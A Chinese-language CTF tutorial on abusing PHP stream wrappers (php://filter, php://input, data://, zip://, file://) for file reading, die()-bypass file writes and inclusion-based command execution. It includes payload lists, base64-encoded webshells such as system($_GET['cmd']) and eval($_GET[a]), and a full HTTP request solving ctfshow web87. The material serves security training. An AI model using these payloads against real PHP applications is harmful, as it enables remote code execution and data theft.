## php://filter伪协议

环境：

- allow_url_fopen ：off/on
- allow_url_include：off/on

`php://filter` 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 `readfile()`、 `file()` 和 `file_get_contents()`， 在数据流内容读取之前没有机会应用其他过滤器。

说人话就是中间件，在输入输出时操作输入输出流

php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。

| 名称                        | 描述                                                         |
| :-------------------------- | :----------------------------------------------------------- |
| `resource=<要过滤的数据流>` | 这个参数是必须的。它指定了你要筛选过滤的数据流。（文件名）   |
| `read=<读链的筛选列表>`     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。 |
| `write=<写链的筛选列表>`    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。 |
| `<；两个链的筛选列表>`      | 任何没有以 `read=` 或 `write=` 作前缀 的筛选器列表会视情况应用于读或写链。 |

常用payload：

```PHP
php://filter/resource=flag.php
php://filter/read=convert.base64-encode/resource=flag.php
php://filter/convert.base64-encode/resource=flag.php
php://filter/convert.quoted-printable-encode/resource=flag.php
php://filter/read=string.rot13/resource=flag.php
php://filter/convert.string.strip_tags/resource=flag.php
// 多个过滤器可以使用管道符连接
php://filter/read=string.rot13|convert.base64-encode/resource=flag.php
// 使用convert.iconv.*编码转换绕过
php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=flag.php
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
// zlib://伪协议读取文件, 但是其他两个压缩伪协议读取不了
compress.zlib://flag.php
// zlib先解压在压缩读取文件
php://filter/zlib.deflate|zlib.inflate/resource=flag.php
```

### 文件读取场景

如下读取文件的场景下，如果存在**is_file()**函数判断文件并过滤，都可以使用伪协议读取将文件读取出来：

```php
<?php
	highlight_file(__FILE__);
	show_source($_GET['file']);
	// highlight_file($_GET['file']);
	// file_get_contents($_GET['file']);
	// include($_GET['file']);
	// include_once($_GET['file']);
	// require($_GET['file']);
	// require_once($_GET['file']);
	// $handle = fopen($_GET['file'], 'r');while (($line = fgets($handle)) !== false) {echo $line;}if(!fclose($handle)){die('Failed to close file');}
	// $contents = file_get_contents($_GET['file']);echo $contents;
	// print_r(file($_GET['file']));
?>
```

payload：

```php
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

![filter_read](.\php伪协议image\filter_read.png)

![filter_base64](.\php伪协议image\filter_base64.png)

### 文件写入场景—file_put_content和死亡·杂糅

参考：

https://xz.aliyun.com/t/8163?time__1311=n4%2BxnD0Dc7GQ0%3DDCDgADlhjm57KWwo3lErTD#toc-3

https://www.leavesongs.com/PENETRATION/php-filter-magic.html

针对文件写入场景主要是处理死亡`exit(); die(); ?>`的情况

如下场景：

```php
<?php
    highlight_file(__FILE__);
    echo $_POST['content'];
    file_put_contents(urldecode($_GET['file']), "<?php exit('66');?>".$content);
    /*file_put_contents(urldecode($_GET['file']), "<?php die('66');?>".$content);*/
?>
```

![filter_write_1](.\php伪协议image\filter_write_1.png)

写入后的文件如下：

![filter_write_code](.\php伪协议image\filter_write_code.png)

访问后并不会执行`phpinfo();`因为exit();退出了

![filter_write_2](.\php伪协议image\filter_write_2.png)

可以使用php://filter的过滤器对原本的代码进行转换使其解析不了

```txt
file=php://filter/write=convert.base64.decode/resource=1.php
content=aaaPD9waHAgcGhwaW5mbygpOw==
PD9waHAgcGhwaW5mbygpOw== --> <?php phpinfo();
前面填充的aaa是为了让<?php exit('66');?>aaaPD9waHAgcGhwaW5mbygpOw==满足4的倍数才能使base64正确解码
```

![filter_write_3](.\php伪协议image\filter_write_3.md)

访问后成功执行php

![filter_write_4](.\php伪协议image\filter_write_4.png)

当然除了base64以外其他的编码也可以用常用杂糅方式

**注意：传参时记得url编码，不同编码可能会产生特殊字符，为了不必要的多次调试记得url编码**

```php
php://filter/write=convert.base64-encode/resource=1.php
php://filter/write=string.rot13/resource=1.php
// <?cuc cucvasb();?> -> <?php phpinfo();?>
php://filter/write=string.rot13|<?cuc cucvasb();?>|/resource=1.php
// convert.iconv.*编码器利用，payload用 echo iconv('UCS-2BE','UCS-2LE','<?php phpinfo();?>');来构造
php://filter/write=convert.iconv.UCS-4LE.UCS-4BE/resource=1.php // 必须构成2的倍数
php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php // 必须构成4的倍数
php://filter/convert.iconv.UCS-2LE.UCS-2BE|convert.base64-decode?/resource=1.php
// utf-7->utf-8->base64的组合拳利用PD9waHAgQGV2YWwoJF9HRVRbYV0pOz8%2B%2D --> <?php @eval($_GET[a]);?>
php://filter/write=PD9waHAgQGV2YWwoJF9HRVRbYV0pOz8%2B%2D|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=1.php
// 利用.htaccess文件和string.strip_tags绕过
php://filter/write=string.strip_tags/resource=.htaccess
```

payload构造方法根据实际情况使用特定函数编码

```php
<?php
    # UTF-8->UTF-7->base64组合拳
    echo base64_encode('<?php @eval($_GET[a]);?>').'<br>';
    echo iconv("UTF-8","UTF-7",base64_encode('<?php @eval($_GET[a]);?>')).'<br>';
    $a = iconv("UTF-8","UTF-7",base64_encode('<?php @eval($_GET[a]);?>'));
    echo base64_decode(iconv("UTF-7","UTF-8",$a));
	# UCS-2*->base64组合拳
    echo base64_encode('<?php @eval($_GET[a]);?>').'<br>';
    echo iconv("UCS-2BE","UCS-2LE",base64_encode('<?php @eval($_GET[a]);?>')).'<br>';
    $a = iconv("UCS-2BE","UCS-2LE",base64_encode('<?php @eval($_GET[a]);?>'));
    echo base64_decode(iconv("UCS-2LE","UCS-2BE",$a));
?>
```

例题：ctfshow_web87

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:57:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);

    
}else{
    highlight_file(__FILE__);
}
```

使用filter过滤器对输入流进行base64解码扰乱插入的`<?php die('大佬别秀了');?>`，使其不能解析为php，而后面插入的content内容为想要插入的攻击代码的base64编码即可，这样后面的内容就能正常解码出攻击代码，这样既绕过了die也成功注入了攻击代码。不过要使前面`<?php die('大佬别秀了');?>`解码成功还要补位使可解码字符为8的倍数，由于base64编码的组成字符只有`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/`所以`<?');>`不算有效字符，有效字符只有phpdie不满足4的倍数，所以构造如下content：

```
# aa为补齐字符phpdieaa共8位满足base64解码条件，补齐字符只要再base64编码字符集中即可
content=aaPD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pO3N5c3RlbSgkX0dFVFsnY21kJ10pOw==
PD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pO3N5c3RlbSgkX0dFVFsnY21kJ10pOw== 
--> <?php highlight_file(__FILE__);system($_GET['cmd']);
```

既然要使用base64解码扰乱原始字符就使用了filter伪协议：

```
php://filter/write=convert.base64-decode/resource=1.php
file要经过两次url编码因为file_put_contents(urldecode($file)
中间件解码了一次上述代码有解码了一次
file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
另外由于file要进行两次编码，如下几个替换都无效，因为在替换时的file还有一层url编码
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
```

完整payload（post参数要url编码）

```http
POST /?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30 HTTP/1.1
Host: 1b09a7e9-c2f5-4bc1-80ea-d0ba2f2918b3.challenge.ctf.show
Content-Length: 86
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://1b09a7e9-c2f5-4bc1-80ea-d0ba2f2918b3.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://1b09a7e9-c2f5-4bc1-80ea-d0ba2f2918b3.challenge.ctf.show/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=0, i
Connection: close

content=aaPD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pO3N5c3RlbSgkX0dFVFsnY21kJ10pOw%3D%3D
```

![web87flag](.\image_include\web87_flag.png)

ctfshow{7c5fc6fb-824a-4ab1-a2eb-01264953da6e}

## php://input伪协议

### php://input结合文件包含实现命令执行

**在遇到文件包含时可以利用php://input实现命令执行**

场景：

```php
<?php
    highlight_file(__FILE__);
    echo $_GET[a];
    include($_GET[a]);
?>
```

传入`?a=<?php system(dir);?>`是不会执行命令的并且报错不能打开流，在1.php中放入`<?php system(dir);?>`并传入`?a=1.php`是可以被执行的，原因是include只能包含文件或者流。

![input_1](.\php伪协议image\input_1.png)

另外在不能上传文件的情况下，也可以使用php://input把post中的参数作为输入流传入实现命令执行，注意传入的不是`<?php system(dir);?>`而是输入流，输入流有`<?php system(dir);?>`

![input_2](.\php伪协议image\input_2.png)

所以只要能识别流的函数都可以使用php://input作为输入，常见函数（满足上面php://filter的函数都适用）：

```php
<?php
    highlight_file(__FILE__);
    echo $_GET[a];
    include($_GET[a]);
	// include_once($_GET[a]);
	// require($_GET[a]);
	// require_once($_GET[a]);
	// show_source($_GET[a]);
	// highlight_file($_GET[a]);
	// echo file_get_contents($_GET[a]);
	// $handle = fopen($_GET[a], 'r');while (($line = fgets($handle)) !== false) {echo $line;}if(!fclose($handle)){die('Failed to close file');}
	// $contents = file_get_contents($_GET[a]);echo $contents;
	// print_r(file($_GET[a]));
?>
```

但是通常能用来实现命令执行的就只有，其他的多用来读去输入流

```php
<?php
	include($_GET[a]);
	// include_once($_GET[a]);
	// require($_GET[a]);
	// require_once($_GET[a]);
?>
```

### php://input绕过file_get_contents()

另外值得注意的是在一些场景下php://input可以用来绕过file_get_contents()

例题：

```php
<?php
    highlight_file(__FILE__);
    include("flag.php");
    extract($_GET);
    if (!empty($ac)){
        $f = trim(file_get_contents($fn));
        if ($ac === $f){
            echo "<p>This is flag:" ." $flag</p>";
        }else{
            echo "<p>sorry!</p>";
        }
    }
?>
```

显然思路就是知道某个文件中的内容，然后使$ac等于该文件中的内容，$fn读取该文件，但是显然不知道文件内容就没办法绕过`if ($ac === $f)`，上面在常用函数中说了file_get_contents()也可以读取文件流，所以使用php://input绕过即可

![input_3](.\php伪协议image\input_3.png)

## data://伪协议搭配文件包含实现命令执行

data://是一个数据流封装器。

环境：

- allow_url_fopen ：on
- allow_url_include：on

题目：

```php
<?php
    highlight_file(__FILE__);
    echo $_GET[a];
    include($_GET[a]);
	// show_source($_GET[a]);
	// highlight_file($_GET[a]);
	// echo file_get_contents($_GET[a]);
	// include_once($_GET[a]);
	// require($_GET[a]);
	// require_once($_GET[a]);
	// $handle = fopen($_GET[a], 'r');while (($line = fgets($handle)) !== false) {echo $line;}if(!fclose($handle)){die('Failed to close file');}
	// $contents = file_get_contents($_GET[a]);echo $contents;
	// print_r(file($_GET[a]));
```

payload

```bash
# 明文
http://10.10.10.1/ctf/input.php?a=data://text/plain,%3C?php%20phpinfo();?%3E

# base64 编码
http://10.10.10.1/ctf/input.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B
```

## zip://伪协议

**zip://伪协议用于访问压缩文件中的子文件**假设有一个情况只能上传zip文件，现有一个文件包含利用点，目的是控制服务器

### zip://伪协议的使用

**zip://zipfilepath\#dir/file.php**
**zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]** 在使用时#要url编码%23

场景

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>文件上传</title>
</head>
<body>
    <h1>上传ZIP文件</h1>
    <?php
    // 检查是否有文件被上传
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileUpload'])) {
        // 检查是否有错误发生
        if ($_FILES['fileUpload']['error'] == 0) {
            // 获取文件名
            $filename = $_FILES['fileUpload']['name'];
            // 获取文件扩展名
            $ext = pathinfo($filename, PATHINFO_EXTENSION);

            // 检查文件扩展名是否为zip
            if (strtolower($ext) == 'zip') {
                // 指定上传目录
                $upload_dir = 'uploads/';
                // 创建目录如果不存在
                if (!is_dir($upload_dir)) {
                    mkdir($upload_dir, 0755, true);
                }
                // 指定文件保存路径
                $new_filename = $upload_dir . basename($filename);
                // 移动文件到指定目录
                if (move_uploaded_file($_FILES['fileUpload']['tmp_name'], $new_filename)) {
                    echo "文件上传成功：文件位置为".$new_filename;
                } else {
                    echo "文件上传失败，请稍后再试。";
                }
            } else {
                echo "只允许上传ZIP格式的文件。";
            }
        } else {
            echo "文件上传过程中发生错误。";
        }
    }
	echo 'include($_GET["file"])';
	if (isset($_GET['file'])){
        	include($_GET['file']);
    	}
    ?>
    <form action="" method="post" enctype="multipart/form-data">
        <label for="fileUpload">选择ZIP文件:</label>
        <input type="file" id="fileUpload" name="fileUpload" accept=".zip">
        <input type="submit" value="上传文件" name="submit">
    </form>
</body>
</html>
```

![zip_upload](F:\桌面\CTFShow\php伪协议image\zip_upload.png)



可以构造zip压缩包利用zip://伪协议包含zip文件中的webshell

![zip_1](.\php伪协议image\zip_1.png)

payload：

```php
?file=zip://uploads/shell.zip%23shell.php
```



![zip_shell](.\php伪协议image\zip_shell.png)

## zlib://协议

环境：

- allow_url_fopen ：off/on
- allow_url_include：off/on

用法：

- compress.zlib://file.gz

该协议除了打开gz压缩文件以外，还可以用来读取文件

![zlib](F:\桌面\CTFShow\php伪协议image\zlib.png)

## bzip2://伪协议

环境：

- allow_url_fopen ：off/on
- allow_url_include：off/on

用法

```
compress.bzip2://file.bz2
```

不常用，用来打开.bz2压缩文件用法与其他两个压缩协议一样

## file://伪协议

环境：

- allow_url_fopen ：off/on
- allow_url_include：off/on

用法：

```
http://10.10.10.1/ctf/input.php?a=file://E:/phpstudy_pro/WWW/ctf/flag.php
```

例子：

```php
<?php
    highlight_file(__FILE__);
    echo $_GET[a];
    // include($_GET[a]);
	show_source($_GET[a]);
	// highlight_file($_GET[a]);
	// echo file_get_contents($_GET[a]);
	// include_once($_GET[a]);
	// require($_GET[a]);
	// require_once($_GET[a]);
	// $handle = fopen($_GET[a], 'r');while (($line = fgets($handle)) !== false) {echo $line;}if(!fclose($handle)){die('Failed to close file');}
	// $contents = file_get_contents($_GET[a]);echo $contents;
	// print_r(file($_GET[a]));
```

